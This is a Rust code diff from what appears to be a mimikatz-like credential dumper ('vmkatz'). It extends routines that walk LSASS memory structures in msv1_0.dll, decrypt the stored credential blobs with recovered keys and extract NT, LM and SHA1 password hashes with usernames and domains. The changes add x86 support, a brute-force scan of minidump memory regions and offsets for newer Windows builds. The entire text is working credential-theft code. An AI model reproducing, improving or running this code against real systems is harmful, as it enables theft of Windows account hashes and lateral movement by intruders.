-    let sub_data = match vmem.read_virt_bytes(sid_addr + 8, sub_count * 4) {
+    let sub_data = match vmem.read_virt_bytes(addr + 8, sub_count * 4) {
         Ok(d) => d,
         Err(_) => return String::new(),
     };
-    let mut s = format!("S-{}-{}", revision, authority);
-    for i in 0..sub_count {
-        let sub = u32::from_le_bytes([
-            sub_data[i * 4],
-            sub_data[i * 4 + 1],
-            sub_data[i * 4 + 2],
-            sub_data[i * 4 + 3],
-        ]);
-        s.push_str(&format!("-{}", sub));
-    }
-    s
+    super::types::format_sid_from_bytes(&header, &sub_data)
 }
 
 /// Extract MSV1_0 credentials (NTLM hashes) from msv1_0.dll.
-pub fn extract_msv_credentials(
-    vmem: &impl VirtualMemory,
+/// `build_number` enables build-aware variant prioritization (0 = unknown).
+fn extract_msv_credentials(
+    vmem: &dyn VirtualMemory,
     msv_base: u64,
     _msv_size: u32,
     keys: &CryptoKeys,
+    build_number: u32,
 ) -> Result<Vec<(u64, MsvCredential)>> {
     let pe = PeHeaders::parse_from_memory(vmem, msv_base)?;
     let mut results = Vec::new();
@@ -577,15 +823,18 @@ pub fn extract_msv_credentials(
         Err(e) => {
             log::info!("Code pattern scan failed (likely paged out): {}", e);
             // Fallback: scan .data section for ALL topology-valid LIST_ENTRY heads
-            find_all_logon_session_list_candidates(vmem, &pe, msv_base)?
+            find_all_logon_session_list_candidates(vmem, &pe, msv_base, Arch::X64)?
         }
     };
 
     if list_addrs.is_empty() {
-        return Err(crate::error::GovmemError::PatternNotFound(
+        return Err(crate::error::VmkatzError::PatternNotFound(
             "LogonSessionList in msv1_0.dll".to_string(),
         ));
     }
+
+    // Build-aware variant ordering for credential extraction
+    let cred_variant_order = variant_order_for_build(build_number);
 
     // Auto-detect the correct (list, offset variant) by trying each combination
     for (li, list_addr) in list_addrs.iter().enumerate() {
@@ -597,7 +846,8 @@ pub fn extract_msv_credentials(
             continue;
         }
 
-        for (vi, offsets) in MSV_OFFSET_VARIANTS.iter().enumerate() {
+        for &vi in &cred_variant_order {
+            let offsets = &MSV_OFFSET_VARIANTS[vi];
             // Try reading username from the first few entries with this variant
             let mut current = head_flink;
             let mut visited = std::collections::HashSet::new();
@@ -680,7 +930,7 @@ pub fn extract_msv_credentials(
 }
 
 fn walk_msv_list(
-    vmem: &impl VirtualMemory,
+    vmem: &dyn VirtualMemory,
     list_addr: u64,
     offsets: &MsvOffsets,
     keys: &CryptoKeys,
@@ -723,7 +973,7 @@ fn walk_msv_list(
                 .unwrap_or(0);
             if ptr != 0 && is_heap_ptr(ptr) {
                 // Verify it's actually a KIWI_MSV1_0_PRIMARY_CREDENTIALS
-                if is_primary_credentials_struct(vmem, ptr) {
+                if is_primary_credentials_struct(vmem, ptr, Arch::X64) {
                     Some(ptr)
                 } else {
                     log::debug!(
@@ -744,7 +994,7 @@ fn walk_msv_list(
         if let Some(cred_ptr) = cred_ptr {
             if !username.is_empty() {
                 if let Ok(cred) =
-                    extract_primary_credential(vmem, cred_ptr, keys, &mut validated_variant)
+                    extract_primary_credential(vmem, cred_ptr, keys, &mut validated_variant, Arch::X64)
                 {
                     log::info!(
                         "MSV credential: LUID=0x{:x} user={} domain={} NT={}",
@@ -785,11 +1035,12 @@ fn walk_msv_list(
 
 /// Scan an entry's memory for a pointer to KIWI_MSV1_0_PRIMARY_CREDENTIALS.
 /// Identified by the "Primary" ANSI_STRING at offset +0x08 in the target structure.
-fn find_credentials_ptr_in_entry(vmem: &impl VirtualMemory, entry_addr: u64) -> Option<u64> {
-    // Scan 8-byte aligned offsets for heap pointers
-    // Start at 0x80 (past known UNICODE_STRING fields) up to 0x220
+fn find_credentials_ptr_in_entry(vmem: &dyn VirtualMemory, entry_addr: u64) -> Option<u64> {
+    // Scan 8-byte aligned offsets for heap pointers.
+    // Range extended to 0x400 to cover Win10 19041+ builds where pCredentials
+    // can be at entry+0x2a0..0x2b0 (beyond the original 0x220 ceiling).
     let mut heap_ptrs_found = 0;
-    for off in (0x80..0x220usize).step_by(8) {
+    for off in (0x80..0x400usize).step_by(8) {
         let ptr = match vmem.read_virt_u64(entry_addr + off as u64) {
             Ok(p) => p,
             Err(_) => continue,
@@ -799,7 +1050,7 @@ fn find_credentials_ptr_in_entry(vmem: &impl VirtualMemory, entry_addr: u64) -> 
         }
         heap_ptrs_found += 1;
         // Direct check: does this point to KIWI_MSV1_0_PRIMARY_CREDENTIALS?
-        if is_primary_credentials_struct(vmem, ptr) {
+        if is_primary_credentials_struct(vmem, ptr, Arch::X64) {
             log::info!(
                 "  Auto-detected pCredentials at entry+0x{:x} -> 0x{:x}",
                 off,
@@ -809,7 +1060,7 @@ fn find_credentials_ptr_in_entry(vmem: &impl VirtualMemory, entry_addr: u64) -> 
         }
     }
     // Second pass: try one level of indirection (entry -> intermediate -> Primary)
-    for off in (0x80..0x220usize).step_by(8) {
+    for off in (0x80..0x400usize).step_by(8) {
         let ptr = match vmem.read_virt_u64(entry_addr + off as u64) {
             Ok(p) => p,
             Err(_) => continue,
@@ -826,12 +1077,39 @@ fn find_credentials_ptr_in_entry(vmem: &impl VirtualMemory, entry_addr: u64) -> 
             if !is_heap_ptr(inner_ptr) {
                 continue;
             }
-            if is_primary_credentials_struct(vmem, inner_ptr) {
+            if is_primary_credentials_struct(vmem, inner_ptr, Arch::X64) {
                 log::info!(
                     "  Auto-detected pCredentials (indirect) at entry+0x{:x} -> 0x{:x} +0x{:x} -> 0x{:x}",
                     off, ptr, inner_off, inner_ptr
                 );
                 return Some(inner_ptr);
+            }
+        }
+    }
+    // Third pass: direct inline scan — the credentials struct may be embedded
+    // within the session entry itself (no pointer indirection). Search entry bytes
+    // for the ANSI_STRING signature Length=7, MaxLength=8 at 8-byte aligned offsets.
+    if let Ok(entry_data) = vmem.read_virt_bytes(entry_addr, 0x400) {
+        for off in (0x28..0x400usize - 0x28).step_by(8) {
+            // Look for 07 00 08 00 pattern (ANSI_STRING {Length=7, MaxLength=8})
+            if entry_data[off] != 0x07
+                || entry_data[off + 1] != 0x00
+                || entry_data[off + 2] != 0x08
+                || entry_data[off + 3] != 0x00
+            {
+                continue;
+            }
+            // The KIWI_MSV1_0_PRIMARY_CREDENTIALS starts 0x08 bytes before the ANSI_STRING
+            let struct_off = off - 0x08;
+            let struct_addr = entry_addr + struct_off as u64;
+
+            if is_primary_credentials_struct(vmem, struct_addr, Arch::X64) {
+                log::info!(
+                    "  Found inline Primary credentials at entry+0x{:x} (0x{:x})",
+                    struct_off,
+                    struct_addr
+                );
+                return Some(struct_addr);
             }
         }
     }
@@ -844,17 +1122,24 @@ fn find_credentials_ptr_in_entry(vmem: &impl VirtualMemory, entry_addr: u64) -> 
 }
 
 /// Check if a pointer leads to a KIWI_MSV1_0_PRIMARY_CREDENTIALS structure.
-/// Layout:
-///   +0x00: next (PVOID)
-///   +0x08: Primary (ANSI_STRING: Length u16 + MaxLength u16 + pad u32 + Buffer PVOID)
-///   +0x18: Credentials (UNICODE_STRING: encrypted data)
-fn is_primary_credentials_struct(vmem: &impl VirtualMemory, ptr: u64) -> bool {
-    // Check ANSI_STRING at +0x08: Length should be 7 ("Primary"), MaxLength >= 7
-    let length = match vmem.read_virt_u16(ptr + 0x08) {
+///
+/// Layout (arch-dependent):
+///   +0x00: next (PVOID: 8B x64 / 4B x86)
+///   +ps:   Primary (ANSI_STRING: 16B x64 / 8B x86)
+///   +ps+us: Credentials (UNICODE_STRING: encrypted data)
+///
+/// Where ps=ptr_size, us=ustr_size, sb=str_buf_off (offset from string start to Buffer field).
+fn is_primary_credentials_struct(vmem: &dyn VirtualMemory, ptr: u64, arch: Arch) -> bool {
+    let ps = arch.ptr_size();
+    let us = arch.ustr_size();
+    let sb = if arch == Arch::X64 { 8u64 } else { 4 }; // offset within ANSI/UNICODE_STRING to Buffer
+
+    // Check ANSI_STRING Primary: Length should be 7 ("Primary"), MaxLength >= 7
+    let length = match vmem.read_virt_u16(ptr + ps) {
         Ok(l) => l,
         Err(_) => return false,
     };
-    let max_length = match vmem.read_virt_u16(ptr + 0x0A) {
+    let max_length = match vmem.read_virt_u16(ptr + ps + 2) {
         Ok(l) => l,
         Err(_) => return false,
     };
@@ -862,11 +1147,11 @@ fn is_primary_credentials_struct(vmem: &impl VirtualMemory, ptr: u64) -> bool {
         return false;
     }
     // Read the buffer pointer
-    let buf_ptr = match vmem.read_virt_u64(ptr + 0x10) {
+    let buf_ptr = match read_ptr(vmem, ptr + ps + sb, arch) {
         Ok(p) => p,
         Err(_) => return false,
     };
-    if buf_ptr == 0 || buf_ptr < 0x10000 {
+    if !is_valid_user_ptr(buf_ptr, arch) {
         return false;
     }
     // Try to verify "Primary" string (may fail if paged out)
@@ -878,30 +1163,28 @@ fn is_primary_credentials_struct(vmem: &impl VirtualMemory, ptr: u64) -> bool {
         return true;
     }
     // Fallback: check structural properties even if "Primary" string is paged out
-    // The Credentials UNICODE_STRING at +0x18 should have valid Length
-    let cred_len = match vmem.read_virt_u16(ptr + 0x18) {
+    let cred_off = ps + us; // Credentials UNICODE_STRING offset
+    let cred_len = match vmem.read_virt_u16(ptr + cred_off) {
         Ok(l) => l as usize,
         Err(_) => return false,
     };
-    let cred_max_len = match vmem.read_virt_u16(ptr + 0x1A) {
+    let cred_max_len = match vmem.read_virt_u16(ptr + cred_off + 2) {
         Ok(l) => l as usize,
         Err(_) => return false,
     };
-    let cred_buf = match vmem.read_virt_u64(ptr + 0x20) {
+    let cred_buf = match read_ptr(vmem, ptr + cred_off + sb, arch) {
         Ok(p) => p,
         Err(_) => return false,
     };
-    // Encrypted credentials: valid length (non-zero, <= 0x200, must be even for UNICODE_STRING)
-    // Buffer must be a valid heap pointer
     if cred_len == 0 || cred_len > 0x200 || cred_max_len < cred_len {
         return false;
     }
-    if !is_heap_ptr(cred_buf) {
+    if !is_valid_user_ptr(cred_buf, arch) {
         return false;
     }
-    // Additional check: next pointer at +0x00 should be either 0 or a heap ptr
-    let next = vmem.read_virt_u64(ptr).unwrap_or(1);
-    if next != 0 && !is_heap_ptr(next) {
+    // Additional check: next pointer at +0x00 should be either 0 or a valid pointer
+    let next = read_ptr(vmem, ptr, arch).unwrap_or(1);
+    if next != 0 && !is_valid_user_ptr(next, arch) {
         return false;
     }
     log::debug!(
@@ -911,67 +1194,81 @@ fn is_primary_credentials_struct(vmem: &impl VirtualMemory, ptr: u64) -> bool {
     true
 }
 
-/// Scan the .data section of msv1_0.dll for ALL topology-valid LIST_ENTRY heads.
+/// Scan the .data section of a DLL for ALL topology-valid LIST_ENTRY heads.
+/// Works for both msv1_0.dll and lsasrv.dll with arch-aware pointer widths.
 fn find_all_logon_session_list_candidates(
-    vmem: &impl VirtualMemory,
+    vmem: &dyn VirtualMemory,
     pe: &PeHeaders,
-    msv_base: u64,
+    dll_base: u64,
+    arch: Arch,
 ) -> Result<Vec<u64>> {
     let data_sec = pe.find_section(".data").ok_or_else(|| {
-        crate::error::GovmemError::PatternNotFound(".data section in msv1_0.dll".to_string())
+        crate::error::VmkatzError::PatternNotFound(".data section in DLL".to_string())
     })?;
 
-    let data_base = msv_base + data_sec.virtual_address as u64;
+    let data_base = dll_base + data_sec.virtual_address as u64;
     let data_size = std::cmp::min(data_sec.virtual_size as usize, 0x10000);
     let data = vmem.read_virt_bytes(data_base, data_size)?;
 
+    let ptr_size = arch.ptr_size() as usize;
+    let list_entry_size = ptr_size * 2; // flink + blink
+
     log::info!(
-        "Scanning msv1_0.dll .data for LIST_ENTRY heads: base=0x{:x} size=0x{:x}",
+        "Scanning DLL .data for LIST_ENTRY heads: base=0x{:x} size=0x{:x} arch={:?}",
         data_base,
-        data_size
+        data_size,
+        arch
     );
+
+    let read_ptr_at = |data: &[u8], off: usize| -> u64 {
+        if arch == Arch::X64 {
+            super::types::read_u64_le(data, off).unwrap_or(0)
+        } else {
+            super::types::read_u32_le(data, off).unwrap_or(0) as u64
+        }
+    };
 
     let mut candidates = Vec::new();
 
-    for off in (0..data_size.saturating_sub(16)).step_by(8) {
-        let flink = u64::from_le_bytes(data[off..off + 8].try_into().unwrap());
-        let blink = u64::from_le_bytes(data[off + 8..off + 16].try_into().unwrap());
+    for off in (0..data_size.saturating_sub(list_entry_size)).step_by(ptr_size) {
+        let flink = read_ptr_at(&data, off);
+        let blink = read_ptr_at(&data, off + ptr_size);
 
-        if !is_heap_ptr(flink) || !is_heap_ptr(blink) {
+        if !is_valid_user_ptr(flink, arch) || !is_valid_user_ptr(blink, arch) {
             continue;
         }
-        if flink >= msv_base && flink < msv_base + 0x100000 {
+        if flink >= dll_base && flink < dll_base + 0x100000 {
             continue;
         }
 
         let list_addr = data_base + off as u64;
         let entry_addr = flink;
 
-        let entry_flink = match vmem.read_virt_u64(entry_addr) {
+        let entry_flink = match read_ptr(vmem, entry_addr, arch) {
             Ok(f) => f,
             Err(_) => continue,
         };
-        let entry_blink = match vmem.read_virt_u64(entry_addr + 0x08) {
+        let entry_blink = match read_ptr(vmem, entry_addr + ptr_size as u64, arch) {
             Ok(b) => b,
             Err(_) => continue,
         };
         if entry_blink != list_addr {
             continue;
         }
-        if entry_flink != list_addr && !is_heap_ptr(entry_flink) {
+        if entry_flink != list_addr && !is_valid_user_ptr(entry_flink, arch) {
             continue;
         }
 
         log::debug!(
-            "MSV data scan topology-valid candidate at 0x{:x} (data+0x{:x}): flink=0x{:x} entry_flink=0x{:x}",
+            "Data scan topology-valid candidate at 0x{:x} (data+0x{:x}): flink=0x{:x} entry_flink=0x{:x}",
             list_addr, off, flink, entry_flink
         );
         candidates.push(list_addr);
     }
 
     log::info!(
-        "MSV data scan: {} topology-valid candidates",
-        candidates.len()
+        "Data scan: {} topology-valid candidates (arch={:?})",
+        candidates.len(), arch
     );
     Ok(candidates)
 }
@@ -982,13 +1279,13 @@ fn find_all_logon_session_list_candidates(
 ///   - Non-empty buckets have Flink pointing to first MSV1_0_LIST entry (heap)
 ///     Returns: list of (bucket_addr, bucket_count) for potential hash tables found.
 fn find_inline_hash_table(
-    vmem: &impl VirtualMemory,
+    vmem: &dyn VirtualMemory,
     pe: &PeHeaders,
     msv_base: u64,
 ) -> Result<Vec<(u64, usize)>> {
     let msv_end = msv_base + 0x100000; // Upper bound of DLL image
     let data_sec = pe.find_section(".data").ok_or_else(|| {
-        crate::error::GovmemError::PatternNotFound(".data section in msv1_0.dll".to_string())
+        crate::error::VmkatzError::PatternNotFound(".data section in msv1_0.dll".to_string())
     })?;
 
     let data_base = msv_base + data_sec.virtual_address as u64;
@@ -1001,8 +1298,8 @@ fn find_inline_hash_table(
 
     // Scan for consecutive 16-byte LIST_ENTRY entries that form a valid hash table
     for off in (0..data_size.saturating_sub(16)).step_by(16) {
-        let flink = u64::from_le_bytes(data[off..off + 8].try_into().unwrap());
-        let blink = u64::from_le_bytes(data[off + 8..off + 16].try_into().unwrap());
+        let flink = super::types::read_u64_le(&data, off).unwrap_or(0);
+        let blink = super::types::read_u64_le(&data, off + 8).unwrap_or(0);
         let self_addr = data_base + off as u64;
 
         // A valid hash table bucket has:
@@ -1053,7 +1350,7 @@ fn find_inline_hash_table(
 
 /// Walk all buckets in a hash table and extract MSV credentials from MSV1_0_LIST entries.
 fn walk_hash_table(
-    vmem: &impl VirtualMemory,
+    vmem: &dyn VirtualMemory,
     table_addr: u64,
     bucket_count: usize,
     offsets: &MsvOffsets,
@@ -1105,7 +1402,7 @@ fn walk_hash_table(
                 let ptr = vmem
                     .read_virt_u64(current + offsets.credentials_ptr)
                     .unwrap_or(0);
-                if ptr != 0 && is_heap_ptr(ptr) && is_primary_credentials_struct(vmem, ptr) {
+                if ptr != 0 && is_heap_ptr(ptr) && is_primary_credentials_struct(vmem, ptr, Arch::X64) {
                     Some(ptr)
                 } else {
                     find_credentials_ptr_in_entry(vmem, current)
@@ -1121,6 +1418,7 @@ fn walk_hash_table(
                         cred_ptr,
                         keys,
                         &mut validated_variant,
+                        Arch::X64,
                     ) {
                         log::info!(
                             "MSV credential (hash table bucket {}): LUID=0x{:x} user={} domain={} NT={}",
@@ -1171,7 +1469,7 @@ use crate::lsass::patterns::is_heap_ptr;
 /// Returns (list_addr, bucket_count). After the pattern, mimikatz resolves
 /// two LEA instructions: one for the list (array of LIST_ENTRY heads) and
 /// one for the count (DWORD). We find all LEAs and identify which is which.
-fn find_list_addr_and_count(vmem: &impl VirtualMemory, pattern_addr: u64) -> Result<(u64, usize)> {
+fn find_list_addr_and_count(vmem: &dyn VirtualMemory, pattern_addr: u64) -> Result<(u64, usize)> {
     let data = vmem.read_virt_bytes(pattern_addr, 0x80)?;
     let mut lea_addrs = Vec::new();
 
@@ -1193,7 +1491,7 @@ fn find_list_addr_and_count(vmem: &impl VirtualMemory, pattern_addr: u64) -> Res
     }
 
     if lea_addrs.is_empty() {
-        return Err(crate::error::GovmemError::PatternNotFound(
+        return Err(crate::error::VmkatzError::PatternNotFound(
             "LEA for LogonSessionList".to_string(),
         ));
     }
@@ -1220,7 +1518,7 @@ fn find_list_addr_and_count(vmem: &impl VirtualMemory, pattern_addr: u64) -> Res
     }
 
     let list = list_addr.ok_or_else(|| {
-        crate::error::GovmemError::PatternNotFound("LogonSessionList address".to_string())
+        crate::error::VmkatzError::PatternNotFound("LogonSessionList address".to_string())
     })?;
 
     if count == 0 {
@@ -1230,7 +1528,7 @@ fn find_list_addr_and_count(vmem: &impl VirtualMemory, pattern_addr: u64) -> Res
     Ok((list, count))
 }
 
-fn find_list_addr(vmem: &impl VirtualMemory, pattern_addr: u64) -> Result<u64> {
+fn find_list_addr(vmem: &dyn VirtualMemory, pattern_addr: u64) -> Result<u64> {
     find_list_addr_and_count(vmem, pattern_addr).map(|(addr, _)| addr)
 }
 
@@ -1241,78 +1539,268 @@ pub struct RawPrimaryCred {
     pub sha1_hash: [u8; 20],
 }
 
+/// Scan all memory regions for KIWI_MSV1_0_PRIMARY_CREDENTIALS structures.
+/// This is the VirtualMemory equivalent of `scan_phys_for_msv_credentials` in finder.rs.
+/// Used as a fallback for minidumps when the standard MSV list walk fails.
+pub fn scan_vmem_for_msv_credentials(
+    vmem: &dyn VirtualMemory,
+    regions: &[(u64, u64)],
+    keys: &CryptoKeys,
+    arch: Arch,
+) -> Vec<(u64, MsvCredential)> {
+    let mut results = Vec::new();
+    let mut validated_variant: Option<usize> = None;
+    let mut candidates_found = 0u64;
+    let mut regions_scanned = 0u64;
+
+    // ANSI_STRING "Primary" starts at ptr_size offset from struct base
+    let ps = arch.ptr_size() as usize;
+    let align = ps; // alignment: 8 on x64, 4 on x86
+
+    log::info!(
+        "MSV vmem-scan: searching {} memory regions for Primary credential structures (arch={:?})...",
+        regions.len(), arch
+    );
+
+    for &(region_va, region_size) in regions {
+        let chunk_size = 0x10000usize; // 64KB
+        let mut offset = 0u64;
+
+        while offset < region_size {
+            let read_size = std::cmp::min(chunk_size as u64, region_size - offset) as usize;
+            if read_size < 0x28 {
+                break;
+            }
+
+            let chunk_va = region_va + offset;
+            let data = match vmem.read_virt_bytes(chunk_va, read_size) {
+                Ok(d) => d,
+                Err(_) => {
+                    offset += chunk_size as u64;
+                    continue;
+                }
+            };
+
+            if data.iter().all(|&b| b == 0) {
+                offset += chunk_size as u64;
+                continue;
+            }
+
+            // Scan for ANSI_STRING signature: Length=7 (0x0007), MaxLength=8 (0x0008)
+            // This appears at offset ps (ptr_size) from struct start.
+            for scan_off in (0..read_size.saturating_sub(0x28)).step_by(align) {
+                if data[scan_off] != 0x07
+                    || data[scan_off + 1] != 0x00
+                    || data[scan_off + 2] != 0x08
+                    || data[scan_off + 3] != 0x00
+                {
+                    continue;
+                }
+
+                // struct starts ps bytes before the ANSI_STRING
+                if scan_off < ps {
+                    continue;
+                }
+                let struct_off = scan_off - ps;
+                let struct_va = chunk_va + struct_off as u64;
+
+                if !is_primary_credentials_struct(vmem, struct_va, arch) {
+                    continue;
+                }
+
+                candidates_found += 1;
+                log::info!(
+                    "MSV vmem-scan: Primary credential candidate at VA 0x{:x}",
+                    struct_va
+                );
+
+                match extract_primary_credential(vmem, struct_va, keys, &mut validated_variant, arch) {
+                    Ok(cred) => {
+                        if looks_like_hash(&cred.nt_hash) || looks_like_hash(&cred.lm_hash) {
+                            let (username, domain) =
+                                extract_username_from_cred_blob(vmem, struct_va, keys, arch);
+                            log::info!(
+                                "MSV vmem-scan: extracted credential at 0x{:x}: user='{}' domain='{}' NT={}",
+                                struct_va, username, domain, hex::encode(cred.nt_hash)
+                            );
+                            let msv_cred = MsvCredential {
+                                username,
+                                domain,
+                                nt_hash: cred.nt_hash,
+                                lm_hash: cred.lm_hash,
+                                sha1_hash: cred.sha1_hash,
+                            };
+                            results.push((0, msv_cred));
+                        }
+                    }
+                    Err(e) => {
+                        log::debug!(
+                            "MSV vmem-scan: extraction failed at 0x{:x}: {}",
+                            struct_va, e
+                        );
+                    }
+                }
+            }
+
+            offset += (chunk_size - 0x28) as u64;
+            regions_scanned += 1;
+        }
+    }
+
+    log::info!(
+        "MSV vmem-scan: {} regions scanned, {} candidates, {} credentials extracted",
+        regions_scanned, candidates_found, results.len()
+    );
+    results
+}
+
+/// Extract username and domain from a KIWI_MSV1_0_PRIMARY_CREDENTIALS structure.
+///
+/// The encrypted blob (UNICODE_STRING at Credentials field) decrypts to:
+///   +0x00: LogonDomainName (UNICODE_STRING: arch-dependent size)
+///   +ustr_size: UserName (UNICODE_STRING: arch-dependent size)
+/// Buffer fields are offsets into the decrypted blob, or VAs in LSASS memory.
+pub(crate) fn extract_username_from_cred_blob(
+    vmem: &dyn VirtualMemory,
+    cred_struct_ptr: u64,
+    keys: &CryptoKeys,
+    arch: Arch,
+) -> (String, String) {
+    let ps = arch.ptr_size();
+    let us = arch.ustr_size();
+    let sb = if arch == Arch::X64 { 8u64 } else { 4 };
+    let cred_len_off = ps + us;      // Credentials.Length offset in wrapper struct
+    let cred_buf_off = cred_len_off + sb; // Credentials.Buffer offset
+
+    let enc_size = match vmem.read_virt_u16(cred_struct_ptr + cred_len_off) {
+        Ok(s) => s as usize,
+        Err(_) => return (String::new(), String::new()),
+    };
+    if enc_size == 0 || enc_size > 0x400 {
+        return (String::new(), String::new());
+    }
+    let enc_ptr = match read_ptr(vmem, cred_struct_ptr + cred_buf_off, arch) {
+        Ok(p) if is_valid_user_ptr(p, arch) => p,
+        _ => return (String::new(), String::new()),
+    };
+    let enc_data = match vmem.read_virt_bytes(enc_ptr, enc_size) {
+        Ok(d) => d,
+        Err(_) => return (String::new(), String::new()),
+    };
+    let decrypted = match crate::lsass::crypto::decrypt_credential(keys, &enc_data) {
+        Ok(d) => d,
+        Err(_) => return (String::new(), String::new()),
+    };
+
+    // Decrypted blob has UNICODE_STRINGs with arch-specific size
+    let min_size = (us * 2) as usize;
+    if decrypted.len() < min_size {
+        return (String::new(), String::new());
+    }
+
+    let domain_len = u16::from_le_bytes([decrypted[0], decrypted[1]]) as usize;
+    let user_off = us as usize;
+    let user_len = u16::from_le_bytes([decrypted[user_off], decrypted[user_off + 1]]) as usize;
+
+    let domain_buf_raw = read_blob_ptr(&decrypted, sb as usize, arch);
+    let user_buf_raw = read_blob_ptr(&decrypted, user_off + sb as usize, arch);
+
+    let domain = read_blob_unicode_string(vmem, &decrypted, domain_buf_raw, domain_len, arch);
+    let username = read_blob_unicode_string(vmem, &decrypted, user_buf_raw, user_len, arch);
+
+    (username, domain)
+}
+
+/// Read a pointer from a decrypted blob at the given offset.
+fn read_blob_ptr(blob: &[u8], off: usize, arch: Arch) -> u64 {
+    if arch == Arch::X64 {
+        if off + 8 <= blob.len() {
+            u64::from_le_bytes(blob[off..off + 8].try_into().unwrap_or([0; 8]))
+        } else {
+            0
+        }
+    } else if off + 4 <= blob.len() {
+        u32::from_le_bytes(blob[off..off + 4].try_into().unwrap_or([0; 4])) as u64
+    } else {
+        0
+    }
+}
+
+/// Read a UNICODE_STRING from a decrypted blob.
+/// Buffer can be either an offset into the blob or a VA in LSASS memory.
+fn read_blob_unicode_string(
+    vmem: &dyn VirtualMemory,
+    blob: &[u8],
+    buf_raw: u64,
+    byte_len: usize,
+    arch: Arch,
+) -> String {
+    if byte_len == 0 || byte_len > 0x200 {
+        return String::new();
+    }
+    // Try as offset into the blob first
+    let buf_off = buf_raw as usize;
+    if buf_off + byte_len <= blob.len() {
+        let data = &blob[buf_off..buf_off + byte_len];
+        return crate::utils::utf16le_decode(data);
+    }
+    // Otherwise treat as VA in LSASS memory
+    if is_valid_user_ptr(buf_raw, arch) {
+        return vmem
+            .read_win_unicode_string_raw(buf_raw, byte_len)
+            .unwrap_or_default();
+    }
+    String::new()
+}
+
 /// Public wrapper for extracting primary credentials from a KIWI_MSV1_0_PRIMARY_CREDENTIALS pointer.
 /// `validated_variant` tracks which PRIMARY_CRED_OFFSET_VARIANT was SHA1-validated for a prior
 /// credential in the same LSASS process. All credentials share the same Windows build → same variant.
 pub fn try_extract_primary_credential(
-    vmem: &impl VirtualMemory,
+    vmem: &dyn VirtualMemory,
     cred_ptr: u64,
     keys: &CryptoKeys,
     validated_variant: &mut Option<usize>,
 ) -> Result<RawPrimaryCred> {
-    extract_primary_credential(vmem, cred_ptr, keys, validated_variant)
+    extract_primary_credential(vmem, cred_ptr, keys, validated_variant, Arch::X64)
 }
 
 fn extract_primary_credential(
-    vmem: &impl VirtualMemory,
+    vmem: &dyn VirtualMemory,
     cred_ptr: u64,
     keys: &CryptoKeys,
     validated_variant: &mut Option<usize>,
+    arch: Arch,
 ) -> Result<RawPrimaryCred> {
-    // KIWI_MSV1_0_PRIMARY_CREDENTIALS (x64):
-    //   +0x00: next (PTR, 8)
-    //   +0x08: Primary (ANSI_STRING: u16 Len + u16 MaxLen + 4pad + PTR Buf = 16 bytes)
-    //   +0x18: Credentials (UNICODE_STRING: u16 Len + u16 MaxLen + 4pad + PTR Buf = 16 bytes)
-    //     +0x18: Credentials.Length (u16)
-    //     +0x20: Credentials.Buffer (PTR)
+    // KIWI_MSV1_0_PRIMARY_CREDENTIALS layout:
+    //   +0x00: next (PVOID)
+    //   +ps:   Primary (ANSI_STRING)
+    //   +ps+us: Credentials (UNICODE_STRING: encrypted credential data)
+    let ps = arch.ptr_size();
+    let us = arch.ustr_size();
+    let sb = if arch == Arch::X64 { 8u64 } else { 4 };
+    let cred_len_off = ps + us;
+    let cred_buf_off = cred_len_off + sb;
 
-    let enc_size = vmem.read_virt_u16(cred_ptr + 0x18)? as usize;
+    let enc_size = vmem.read_virt_u16(cred_ptr + cred_len_off)? as usize;
 
     if enc_size == 0 || enc_size > 0x200 {
         log::info!("  Invalid enc_size {}, trying direct read", enc_size);
-        return Err(crate::error::GovmemError::DecryptionError(format!(
+        return Err(crate::error::VmkatzError::DecryptionError(format!(
             "Invalid encrypted credential size: {}",
             enc_size
         )));
     }
 
-    let enc_data_ptr = vmem.read_virt_u64(cred_ptr + 0x20)?;
-    log::debug!("  Credentials.Buffer = 0x{:x}", enc_data_ptr);
+    let enc_data_ptr = read_ptr(vmem, cred_ptr + cred_buf_off, arch)?;
     if enc_data_ptr == 0 {
-        return Err(crate::error::GovmemError::DecryptionError(
+        return Err(crate::error::VmkatzError::DecryptionError(
             "Null encrypted data pointer".to_string(),
         ));
     }
 
     let enc_data = vmem.read_virt_bytes(enc_data_ptr, enc_size)?;
-    log::debug!(
-        "  Encrypted data ({} bytes): {}...",
-        enc_size,
-        hex::encode(&enc_data[..std::cmp::min(32, enc_data.len())])
-    );
     let decrypted = crate::lsass::crypto::decrypt_credential(keys, &enc_data)?;
-    log::debug!("  Decrypted data ({} bytes):", decrypted.len());
-    for (i, chunk) in decrypted[..std::cmp::min(0xA0, decrypted.len())]
-        .chunks(16)
-        .enumerate()
-    {
-        let hex_str: String = chunk
-            .iter()
-            .map(|b| format!("{:02x}", b))
-            .collect::<Vec<_>>()
-            .join(" ");
-        let ascii: String = chunk
-            .iter()
-            .map(|&b| {
-                if (0x20..0x7f).contains(&b) {
-                    b as char
-                } else {
-                    '.'
-                }
-            })
-            .collect();
-        log::debug!("    {:04x}: {}  {}", i * 16, hex_str, ascii);
-    }
 
     // Try each offset variant and pick the one that makes sense.
     // Validation strategy (ranked by confidence):
@@ -1331,18 +1819,29 @@ fn extract_primary_credential(
     // All credentials in the same LSASS process use the same Windows build → same offsets.
     if let Some(vi) = *validated_variant {
         let offsets = &PRIMARY_CRED_OFFSET_VARIANTS[vi];
-        let nt_off = offsets.nt_hash as usize;
-        let lm_off = offsets.lm_hash as usize;
-        let sha1_off = offsets.sha1_hash as usize;
+        let nt_off = offsets.nt_hash;
+        let lm_off = offsets.lm_hash;
+        let sha1_off = offsets.sha1_hash;
 
         if decrypted.len() >= sha1_off + 20 {
             let mut nt_hash = [0u8; 16];
             let mut lm_hash = [0u8; 16];
+            let mut sha1_hash = [0u8; 20];
             nt_hash.copy_from_slice(&decrypted[nt_off..nt_off + 16]);
             lm_hash.copy_from_slice(&decrypted[lm_off..lm_off + 16]);
+            sha1_hash.copy_from_slice(&decrypted[sha1_off..sha1_off + 20]);
 
-            if nt_hash != [0u8; 16] && looks_like_hash(&nt_hash) {
-                let computed_sha1 = sha1_digest(&nt_hash);
+            if nt_hash != [0u8; 16] && looks_like_hash(&nt_hash)
+                && (lm_hash == [0u8; 16] || lm_hash != nt_hash)
+            {
+                // Use SHA1 from blob directly (ShaOwPassword). For human accounts
+                // this is SHA1(UTF16LE(password)), not SHA1(NT_hash). Only compute
+                // SHA1(NT) as fallback if the blob's sha1 field is zeroed.
+                let final_sha1 = if sha1_hash == [0u8; 20] {
+                    sha1_digest(&nt_hash)
+                } else {
+                    sha1_hash
+                };
                 log::info!(
                     "  Using previously validated variant {} (nt=0x{:x}) for this credential",
                     vi, offsets.nt_hash
